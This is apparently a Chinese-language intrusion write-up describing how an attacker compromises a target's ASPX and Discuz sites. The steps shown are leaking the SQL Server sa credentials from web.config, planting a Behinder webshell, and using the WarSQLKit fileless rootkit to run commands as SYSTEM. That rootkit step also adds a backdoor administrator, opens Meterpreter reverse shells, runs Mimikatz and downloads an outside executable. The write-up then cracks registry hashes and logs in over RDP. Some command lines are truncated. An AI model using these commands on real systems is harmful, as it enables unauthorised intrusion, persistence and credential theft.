问了下师傅，目标有个php dz的站有一个aspx的站，从aspx的读取文件读取到
web.config文件内容，是sa账号，但是降权了，而且传不到aspx文件网站目录里面，
只能传到dz的网站里面，一个asp冰蝎马。  
用了师傅的网站看下进程(皮一下哈哈)  
上次说过了，iis权限就算是管理员权限都一样，powershell啥的net net1肯定是没戏
的。你直接穿exe也是没戏的，连query user都看不了，也断掉了我们传exp上去提
权。  
首先在aspx站找到了sa账号密码和dz的config目录里面找到了root账号i密码。  
主要是有的马被杀了，而且由于我对sql server熟悉一点，所以直接执行。  
之前呢，因为知道 https://github.com/EPICROUTERSS/MSSQL‐Fileless‐
Rootkit‐WarSQLKit 这个项目而且klion师傅说过。
可以看下帮助他是有提权操作的，而且是不落地的提权手法(有错误的话，就当我没
说)。  
因为当时研究过，把所有可利用的不落地文件全部都做好了。  
EXEC sp_cmdExec 'whoami'; => Any Windows command
EXEC sp_cmdExec 'whoami /RunSystemPriv'; => Any Windows command with NT AUTHORITY
EXEC sp_cmdExec '"net user eyup P@ssw0rd1 /add" /RunSystemPriv'; => Adding
EXEC sp_cmdExec '"net localgroup administrators eyup /add" /RunSystemPriv'
EXEC sp_cmdExec 'powershell Get‐ChildItem /RunSystemPS'; => (Powershell) with
EXEC sp_cmdExec 'sp_meterpreter_reverse_tcp LHOST LPORT GetSystem'; => x86
EXEC sp_cmdExec 'sp_x64_meterpreter_reverse_tcp LHOST LPORT GetSystem'; =>
EXEC sp_cmdExec 'sp_meterpreter_reverse_rc4 LHOST LPORT GetSystem'; => x86
EXEC sp_cmdExec 'sp_meterpreter_bind_tcp LPORT GetSystem'; => x86 Meterpreter
EXEC sp_cmdExec 'sp_Mimikatz'; 
select * from WarSQLKitTemp => Get Mimikatz Log. Thnks Benjamin Delpy :)
EXEC sp_cmdExec 'sp_downloadFile http://eyupcelik.com.tr/file.exe C:\ProgramData\fi
EXEC sp_cmdExec 'sp_getSqlHash'; => Get MSSQL Hash
EXEC sp_cmdExec 'sp_getProduct'; => Get Windows Product
EXEC sp_cmdExec 'sp_getDatabases'; => Get Available Database
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
查看下有两个rdp会话，但是都在5月底。  
直接利用sqldumper貌似不行，死活导不出来。只能换个办法了。  
那就只能导出注册表，解密hash试试。  
本地读取下hash文件。  
administrator解密不出来，但是另一个用户解密出来了，登录3389的时候限制了计算
机名称。  
本地更改下计算机名字  
直接rdp登录进来。  
然后也不用传文件，直接sqldumper dump下来就行了。  
本地导入解密下。